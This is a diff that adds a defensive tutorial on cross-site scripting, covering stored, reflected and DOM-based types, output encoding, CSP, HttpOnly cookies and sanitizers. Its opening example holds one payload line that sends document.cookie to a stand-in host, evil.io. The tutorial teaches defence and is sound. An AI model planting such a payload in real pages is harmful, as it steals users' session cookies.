@@ -1,0 +1,42 @@
+XSS (Cross-Site Scripting) is the web's most common serious vulnerability: attacker-supplied text is rendered as _code_ in another user's browser.
+
+## How it happens
+
+```js
+// A comment feature that renders raw HTML:
+commentList.innerHTML = `<div>${comment.text}</div>`;
+// comment.text = "<img src=x onerror='fetch("//evil.io?c="+document.cookie)'>"
+```
+
+The browser can't tell your markup from the attacker's — both arrived as HTML. Three flavors:
+
+- **Stored XSS** — payload saved (in a DB) and served to every viewer. Worst kind.
+- **Reflected XSS** — payload arrives in the request (query string), rendered in the response. Needs the victim to click a crafted link.
+- **DOM-based XSS** — client JS injects unsafe data into the DOM itself (`innerHTML`, `document.write`, `eval`).
+
+## The fix: context-aware output encoding
+
+Data is only dangerous when it _crosses into code_. Encode per destination context:
+
+- **HTML body**: `&lt;` `&gt;` `&amp;` — use `textContent`, never `innerHTML`, for data
+- **HTML attributes**: quote attributes and escape `"`
+- **JavaScript strings**: avoid embedding data in inline scripts entirely
+- **URLs**: `encodeURIComponent` for query values (a `javascript:` URL is also an XSS vector)
+
+```js
+// SAFE: textContent treats data as data
+const div = document.createElement("div");
+div.textContent = comment.text;
+```
+
+React/Vue/Svelte escape by default — which is why the remaining XSS bugs concentrate in `dangerouslySetInnerHTML`, markdown renderers, and attribute sinks. Modern security is knowing where the escape hatches are.
+
+## Defense in depth
+
+- **CSP (Content-Security-Policy)** header: even if a payload lands, CSP can block inline script execution. `Content-Security-Policy: default-src 'self'` is a strong default.
+- **HttpOnly cookies**: session tokens JavaScript can't read — stolen payloads can't lift them.
+- **Sanitizers** (DOMPurify) for the cases where HTML input is genuinely wanted: allowlist tags, strip event handlers.
+
+## Safe verification
+
+In exercises we test with a canary: does `<img src=x onerror=...>` end up as _text_ (good) or as an element with an `onerror` attribute (bad)? Parsing your own rendered output in a controlled toy page is safe and conclusive.
